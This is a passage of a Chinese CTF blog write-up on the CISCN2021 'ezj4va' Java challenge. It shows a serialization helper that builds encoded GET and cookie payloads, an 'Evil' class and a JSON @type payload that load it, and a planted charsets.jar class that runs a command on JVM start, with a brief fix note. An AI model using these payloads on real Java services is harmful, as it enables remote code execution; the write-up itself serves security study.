str)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> == str) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        result = java.net.URLEncoder.encode(str, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">URLDecoderString</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> == str) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        result = java.net.URLDecoder.decode(str, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Exp</span><span class="params">(Cart poc)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">    oos.writeObject(poc);</span><br><span class="line">    baos.close();</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">BASE64Encoder</span>().encode(baos.toByteArray()).replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;--------------------------------------------get数据-------------------------------------------&quot;</span>);</span><br><span class="line">    System.out.println(getURLEncoderString(Exp(getPayload())));</span><br><span class="line">    System.out.println(<span class="string">&quot;--------------------------------------------cookie数据----------------------------------------&quot;</span>);</span><br><span class="line">    System.out.println(Exp(cookiePayload()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>写入文件到 java&#x2F;home&#x2F;jre&#x2F;classes下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil implements AutoCloseable &#123;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void close() throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>触发加载的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">    &quot;@type&quot;:&quot;Evil&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也可以替换<code>charsets.jar</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">package sun.nio.cs.ext;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.nio.charset.Charset;</span><br><span class="line">import java.nio.charset.spi.CharsetProvider;</span><br><span class="line">import java.util.Iterator;</span><br><span class="line"></span><br><span class="line">public class ExtendedCharsets extends CharsetProvider&#123;</span><br><span class="line">    public ExtendedCharsets() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;cmd /c calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            // TODO Auto-generated catch block</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Iterator&lt;Charset&gt; charsets() &#123;</span><br><span class="line">        // TODO Auto-generated method stub</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Charset charsetForName(String charsetName) &#123;</span><br><span class="line">        // TODO Auto-generated method stub</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要运行jvm或者编译字节码 就会触发命令执行</p>
+<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>这里反序列化的时候 加一个过滤 把payload里面的几个危险类过滤掉即可</p>
+<blockquote>
+<p>太难了 后面的就没看了 这个java就做不太来了</p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/07/21/flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/" title="从flask框架到模板注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">从flask框架到模板注入</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php反序列化初学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">php反序列化初学习</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">AsaL1n</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/AsaL1n"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">why we need that??</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezsql"><span class="toc-number">1.</span> <span class="toc-text">ezsql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">sql预处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E8%BD%AC%E4%B9%89"><span class="toc-number">1.2.</span> <span class="toc-text">特殊字符转义</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2021-%E6%80%BB%E5%86%B3%E8%B5%9B-babypython"><span class="toc-number">2.</span> <span class="toc-text">[CISCN2021 总决赛]babypython</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unzip%E8%BD%AF%E8%BF%9E%E6%8E%A5%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.</span> <span class="toc-text">unzip软连接攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uuid"><span class="toc-number">2.2.</span> <span class="toc-text">uuid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">2.3.</span> <span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2021-%E6%80%BB%E5%86%B3%E8%B5%9B-ezj4va"><span class="toc-number">3.</span> <span class="toc-text">[CISCN2021 总决赛]ezj4va</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#aspectj%E9%93%BE%E5%AD%90"><span class="toc-number">3.1.</span> <span class="toc-text">aspectj链子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#poc"><span class="toc-number">3.1.1.</span> <span class="toc-text">poc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">3.2.</span> <span class="toc-text">修复</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/11/java%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B01/" title="java java题目复现 1">java java题目复现 1</a><time datetime="2024-04-10T16:00:00.000Z" title="Created 2024-04-11 00:00:00">2024-04-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/01/php_mvc/" title="NKCTF2024 用过就是熟悉&amp;php_mvc学习">NKCTF2024 用过就是熟悉&amp;php_mvc学习</a><time datetime="2024-03-31T16:00:00.000Z" title="Created 2024-04-01 00:00:00">2024-04-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/27/bypassjava/" title="cbctf bypass_java复现">cbctf bypass_java复现</a><time datetime="2024-03-26T16:00:00.000Z" title="Created 2024-03-27 00:00:00">2024-03-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/26/2024NKCTF/" title="2024NKCTF">2024NKCTF</a><time datetime="2024-03-25T16:00:00.000Z" title="Created 2024-03-26 00:00:00">2024-03-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/18/2024venomctf/" title="2024venomvtf wp+学习">2024venomvtf wp+学习</a><time datetime="2024-03-17T16:00:00.000Z" title="Created 2024-03-18 00:00:00">2024-03-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By AsaL1n</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
